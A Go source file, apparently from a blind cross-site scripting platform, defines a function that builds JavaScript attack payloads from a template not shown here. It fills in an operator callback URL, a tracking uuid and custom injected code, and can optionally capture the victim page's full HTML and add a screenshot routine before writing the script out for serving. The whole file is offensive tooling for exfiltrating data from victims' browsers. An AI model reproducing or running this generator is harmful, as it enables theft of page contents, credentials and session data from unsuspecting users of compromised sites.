package payload

import (
	"fmt"
	"math/rand"
	"os"
	"strings"
)

func GetRandomString(n int) string {  //随机字符串
	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_@!#$%^"
	bytes := []byte(str)
	var result []byte
	for i := 0; i < n; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

// MakePayload 生成js payload
func MakePayload(getname string, url string, uuid string, userpayload string, sc bool,dom bool) {
	if strings.Contains(getname,".") {
		return
	}
	os.Remove("./exp/"+getname)
	var content []byte
	userpayload = strings.Replace(userpayload,"%20","",-1)
	if sc&&dom {
		content = []byte(fmt.Sprintf(payload, url, uuid, "ez_n(document.documentElement.outerHTML)",GetRandomString(10),GetRandomString(10), userpayload) + "\n" + screenshort)
	} else if sc&&!dom{
		content = []byte(fmt.Sprintf(payload, url, uuid, "\"\"",GetRandomString(10),GetRandomString(10), userpayload)+ "\n" + screenshort)
	}else if !sc&&dom {
		content = []byte(fmt.Sprintf(payload, url, uuid, "ez_n(document.documentElement.outerHTML)",GetRandomString(10),GetRandomString(10), userpayload))
	}else if !sc&&!dom {
		content = []byte(fmt.Sprintf(payload, url, uuid,"\"\"",GetRandomString(10),GetRandomString(10), userpayload))
	}

	os.WriteFile("./exp/"+getname,content,0644)
	//ioutil.WriteFile("./exp/"+getname, content, 0600)
}
